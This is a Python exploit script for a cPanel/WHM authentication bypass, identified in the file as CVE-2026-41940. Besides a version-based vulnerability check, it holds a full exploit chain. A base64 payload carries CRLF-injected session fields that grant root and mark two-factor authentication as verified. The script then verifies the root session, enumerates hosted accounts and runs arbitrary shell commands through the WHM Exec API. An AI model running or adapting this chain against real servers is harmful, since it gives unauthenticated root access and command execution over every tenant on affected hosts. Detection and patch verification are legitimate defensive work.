#!/usr/bin/env python3
# CVE-2026-41940 - cPanel/WHM Authentication Bypass
# Author: nickpaulsec

import argparse, json, re, sys, socket, urllib.parse, requests, urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PATCHED = {
    11110: (11,110,0,97), 11118: (11,118,0,63), 11126: (11,126,0,54),
    11132: (11,132,0,29), 11134: (11,134,0,20), 11136: (11,136,0,5),
}

PAYLOAD = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; B = "\033[1m"; X = "\033[0m"

def ok(m):   print(f"  {G}+{X} {m}")
def err(m):  print(f"  {R}-{X} {m}")
def info(m): print(f"  {C}>{X} {m}")
def warn(m): print(f"  {Y}!{X} {m}")
def div():   print(f"  {'-'*52}")


def check_port(host, port):
    try:
        s = socket.socket(); s.settimeout(5)
        r = s.connect_ex((host, port)); s.close()
        return r == 0
    except: return False

def get_canonical(sess, scheme, host, port):
    try:
        r = sess.get(f"{scheme}://{host}:{port}/openid_connect/cpanelid",
                     verify=False, allow_redirects=False, timeout=8)
        m = re.match(r"^https?://([^:/]+)", r.headers.get("Location",""))
        if m: return m.group(1)
    except: pass
    return host

def req(sess, method, scheme, host, port, canonical, path, **kw):
    h = kw.pop("headers", {})
    h.setdefault("Host", f"{canonical}:{port}")
    h.setdefault("Connection", "close")
    return sess.request(method, f"{scheme}://{host}:{port}{path}",
                        headers=h, verify=False, allow_redirects=False, timeout=15, **kw)

def get_version(sess, scheme, host, port, canonical):
    for path in ["/json-api/version", "/xmlapi/version", "/"]:
        try:
            r = req(sess, "GET", scheme, host, port, canonical, path)
            if "json" in r.headers.get("Content-Type",""):
                try:
                    d = r.json()
                    v = d.get("version") or d.get("data",{}).get("version")
                    if v: return v
                except: pass
            for pat in [r'cPanel[^\d]*(\d+\.\d+\.\d+\.\d+)', r'version["\s:]+(\d+\.\d+\.\d+\.\d+)']:
                m = re.search(pat, r.text, re.I)
                if m and m.group(1).startswith("11."): return m.group(1)
            revs = re.findall(r'cPanel_magic_revision_(\d+)', r.text)
            if revs:
                dt = datetime.utcfromtimestamp(max(int(x) for x in revs)).strftime("%Y-%m-%d")
                return f"unknown (assets: {dt})"
        except: continue
    return None

def vuln_check(ver_str):
    try:
        t = tuple(int(x) for x in ver_str.strip().split("."))
        if len(t) != 4: return None, None
        key = t[0]*1000 + t[1]
        threshold = PATCHED.get(key)
        if not threshold: return None, None
        return (t < threshold), ".".join(str(x) for x in threshold)
    except: return None, None

# exploit stages
def s1_session(sess, scheme, host, port, canonical):
    r = req(sess, "POST", scheme, host, port, canonical,
            "/login/?login_only=1", data={"user":"root","pass":"x"})
    for k,v in r.raw.headers.items():
        if k.lower()=="set-cookie" and v.startswith("whostmgrsession="):
            c = urllib.parse.unquote(v.split("=",1)[1].split(";",1)[0])
            return c.split(",",1)[0] if "," in c else c
    return None

def s2_inject(sess, scheme, host, port, canonical, base):
    enc = urllib.parse.quote(base)
    r = req(sess, "GET", scheme, host, port, canonical, "/",
            headers={"Authorization": f"Basic {PAYLOAD}", "Cookie": f"whostmgrsession={enc}"})
    m = re.search(r"/cpsess\d{10}", r.headers.get("Location",""))
    return m.group(0) if m else None

def s3_propagate(sess, scheme, host, port, canonical, base):
    enc = urllib.parse.quote(base)
    r = req(sess, "GET", scheme, host, port, canonical, "/scripts2/listaccts",
            headers={"Cookie": f"whostmgrsession={enc}"})
    return r.status_code == 401 and ("Token denied" in r.text or "WHM Login" in r.text)

def s4_verify(sess, scheme, host, port, canonical, base, token):
    enc = urllib.parse.quote(base)
    r = req(sess, "GET", scheme, host, port, canonical, f"{token}/json-api/version",
            headers={"Cookie": f"whostmgrsession={enc}"})
    if r.status_code == 200 and '"version"' in r.text:
        try: return True, r.json().get("version","?")
        except: return True, "?"
    if r.status_code in (500,503) and "License" in r.text:
        return True, "lab/unlicensed"
    return False, None

def enumerate(sess, scheme, host, port, canonical, base, token):
    enc = urllib.parse.quote(base)
    for label, func in [("version","version"), ("accounts","listaccts")]:
        print(f"\n  [{label}]")
        try:
            r = req(sess, "GET", scheme, host, port, canonical,
                    f"{token}/json-api/{func}?api.version=1",
                    headers={"Cookie": f"whostmgrsession={enc}"})
            try: print(json.dumps(r.json(), indent=4)[:600])
            except: print(r.text[:400])
        except Exception as e: print(f"  error: {e}")

def run_cmd(sess, scheme, host, port, canonical, base, token, cmd):
    enc = urllib.parse.quote(base)
    r = req(sess, "GET", scheme, host, port, canonical,
            f"{token}/json-api/cpanel?api.version=1"
            f"&cpanel_jsonapi_module=Exec&cpanel_jsonapi_func=exec"
            f"&command={urllib.parse.quote(cmd)}",
            headers={"Cookie": f"whostmgrsession={enc}"})
    try: print(json.dumps(r.json(), indent=2))
    except: print(r.text[:500])


def main():
    print(f"\n{B}CVE-2026-41940  |  cPanel/WHM Auth Bypass  |  CVSS 9.8{X}")
    print(f"{C}github.com/nickpaulsec{X}\n")

    p = argparse.ArgumentParser(description="CVE-2026-41940 cPanel/WHM Auth Bypass | nickpaulsec")
    p.add_argument("-t", "--target",  required=True, help="Target host")
    p.add_argument("-p", "--port",    type=int, default=2087, help="Port (default: 2087)")
    p.add_argument("--scheme",        default="https", choices=["http","https"])
    p.add_argument("--exploit",       action="store_true", help="Run exploit chain")
    p.add_argument("--exec",          metavar="CMD", help="Command to run post-exploitation")
    args = p.parse_args()

    host, port, scheme = args.target.strip(), args.port, args.scheme

    info(f"target  {scheme}://{host}:{port}")
    info(f"mode    {'exploit' if args.exploit else 'detect'}")
    print()

    sess = requests.Session()
    sess.verify = False

    if not check_port(host, port):
        err(f"port {port} closed"); sys.exit(1)
    ok(f"port {port} open")

    canonical = get_canonical(sess, scheme, host, port)
    is_shared = canonical != host and not canonical.startswith(host)
    if is_shared:
        warn(f"shared hosting: {canonical}")
        warn(f"blast radius = all tenants on this server")
    else:
        info(f"host: {canonical}")

    ver = get_version(sess, scheme, host, port, canonical)
    if ver:
        info(f"version: {ver}")
        is_vuln, patched = vuln_check(ver)
        if is_vuln is True:   warn(f"below patch threshold ({patched}) — likely vulnerable")
        elif is_vuln is False: ok(f"meets patch threshold ({patched})")
        else: warn("version branch not in patch list")
    else:
        warn("version: could not determine")
        is_vuln = None

    if not args.exploit:
        print()
        div()
        if is_vuln is True:
            print(f"  {R}{B}RESULT: LIKELY VULNERABLE{X}")
        elif is_vuln is False:
            print(f"  {G}{B}RESULT: LIKELY PATCHED{X}")
        else:
            print(f"  {Y}{B}RESULT: INCONCLUSIVE{X}")
            print(f"  run --exploit to confirm")
        if is_shared:
            print(f"\n  {Y}disclose to:{X} {canonical} (hosting provider)")
        div()
        print()
        sys.exit(0)

    # exploit
    print()
    div()
    print(f"  {B}running exploit chain{X}")
    div()
    print()

    info("stage 1: pre-auth session")
    base = s1_session(sess, scheme, host, port, canonical)
    if not base: err("no session cookie returned"); sys.exit(1)
    ok(f"session: {base[:40]}...")

    info("stage 2: crlf injection")
    token = s2_inject(sess, scheme, host, port, canonical, base)
    if not token: err("no token — likely patched"); sys.exit(1)
    ok(f"token: {token}")

    info("stage 3: propagation")
    if not s3_propagate(sess, scheme, host, port, canonical, base):
        err("propagation failed"); sys.exit(1)
    ok("propagated")

    info("stage 4: verify root")
    success, whm_ver = s4_verify(sess, scheme, host, port, canonical, base, token)
    if not success: err("root session not confirmed — likely patched"); sys.exit(1)
    ok(f"root confirmed  (whm {whm_ver})")

    print()
    div()
    print(f"  {R}{B}VULNERABLE — UNAUTHENTICATED ROOT ACCESS{X}")
    print(f"  token: {token}")
    if is_shared:
        print(f"  {Y}shared host — all tenants on {canonical} affected{X}")
    div()
    print()

    if args.exec:
        info(f"exec: {args.exec}")
        run_cmd(sess, scheme, host, port, canonical, base, token, args.exec)
    else:
        info("enumerating (read-only)")
        enumerate(sess, scheme, host, port, canonical, base, token)

    print()


if __name__ == "__main__":
    main()
